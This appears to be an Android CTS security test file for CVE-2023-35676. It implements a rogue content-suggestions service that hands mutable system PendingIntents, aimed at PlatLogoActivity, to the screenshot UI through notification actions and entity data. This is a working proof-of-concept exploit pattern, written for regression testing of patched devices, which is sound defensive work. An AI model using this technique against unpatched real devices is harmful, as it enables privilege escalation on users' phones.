/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_35676;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.contentsuggestions.ClassificationsRequest;
import android.app.contentsuggestions.ContentClassification;
import android.app.contentsuggestions.ContentSelection;
import android.app.contentsuggestions.ContentSuggestionsManager;
import android.app.contentsuggestions.SelectionsRequest;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;

import com.android.internal.app.PlatLogoActivity;

import com.google.android.apps.miphone.aiai.matchmaker.overview.api.generatedv2.EntitiesData;
import com.google.android.apps.miphone.aiai.matchmaker.overview.api.generatedv2.SuggestParcelables;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class ContentSuggestionsService
        extends android.service.contentsuggestions.ContentSuggestionsService {

    @Override
    public void onProcessContextImage(int taskId, Bitmap contextImage, Bundle extras) {}

    @Override
    public void onSuggestContentSelections(
            SelectionsRequest request, ContentSuggestionsManager.SelectionsCallback callback) {
        Notification.Action action =
                new Notification.Action.Builder(
                                null,
                                "title",
                                PendingIntent.getActivity(
                                        this,
                                        0 /* request code */,
                                        new Intent()
                                                .setClassName(
                                                        "android",
                                                        PlatLogoActivity.class.getName()),
                                        PendingIntent.FLAG_MUTABLE))
                        .build();
        ArrayList<Notification.Action> actions = new ArrayList<>();
        actions.add(action);

        Bundle extras = new Bundle();
        extras.putParcelableArrayList("ScreenshotNotificationActions", actions);
        List<ContentSelection> contentSelectionList = new ArrayList<>();
        contentSelectionList.add(new ContentSelection(getString(R.string.placeHolderId), extras));
        callback.onContentSelectionsAvailable(0 /* statusCode */, contentSelectionList);
    }

    @Override
    public void onClassifyContentSelections(
            ClassificationsRequest request,
            ContentSuggestionsManager.ClassificationsCallback callback) {

        Bundle actionBundle = new Bundle();
        actionBundle.putString(getString(R.string.id), getString(R.string.actionId));
        actionBundle.putString(getString(R.string.displayName), getString(R.string.cve_button));
        actionBundle.putString(getString(R.string.fullDisplayName), "actionFullDisplayName");

        Bundle actionGroupBundle = new Bundle();
        actionGroupBundle.putString(getString(R.string.id), "groupID");
        actionGroupBundle.putString(getString(R.string.displayName), "groupDisplayName");
        actionGroupBundle.putBundle(getString(R.string.mainAction), actionBundle);
        ArrayList<Bundle> actionsList = new ArrayList<>();
        actionsList.add(actionGroupBundle);

        Bundle entityBundle = new Bundle();
        entityBundle.putParcelableArrayList(getString(R.string.actions), actionsList);
        entityBundle.putString(getString(R.string.searchQueryHint), "");
        SuggestParcelables.Entity entity = new SuggestParcelables.Entity(entityBundle);

        SuggestParcelables.Entities entities = new SuggestParcelables.Entities();
        entities.entities = new ArrayList();
        entities.entities.add(entity);

        Bundle extraInfoBundle = new Bundle();
        extraInfoBundle.putBoolean(getString(R.string.containsPendingIntents), true);
        extraInfoBundle.putBoolean(getString(R.string.containsBitmaps), true);
        entities.extrasInfo = new SuggestParcelables.ExtrasInfo(extraInfoBundle);

        HashMap pendingIntentMap = new HashMap<>();
        PendingIntent pi =
                PendingIntent.getActivity(
                        this,
                        0 /* request code */,
                        new Intent().setClassName("android", PlatLogoActivity.class.getName()),
                        PendingIntent.FLAG_MUTABLE);
        pendingIntentMap.put(getString(R.string.actionId), pi);

        HashMap bitmapMap = new HashMap<>();
        bitmapMap.put(
                getString(R.string.actionId),
                Bitmap.createBitmap(
                        50 /* width */, 50 /* height */, Bitmap.Config.ARGB_8888 /* config */));

        EntitiesData entitiesData = new EntitiesData(entities, bitmapMap, pendingIntentMap);
        Bundle extras = new Bundle();
        extras.putParcelable("EntitiesData", entitiesData);
        List<ContentClassification> contentSelectionList = new ArrayList<>();
        contentSelectionList.add(
                new ContentClassification(getString(R.string.placeHolderId), extras));
        callback.onContentClassificationsAvailable(0, contentSelectionList);
    }

    @Override
    public void onNotifyInteraction(String requestId, Bundle interaction) {}
}
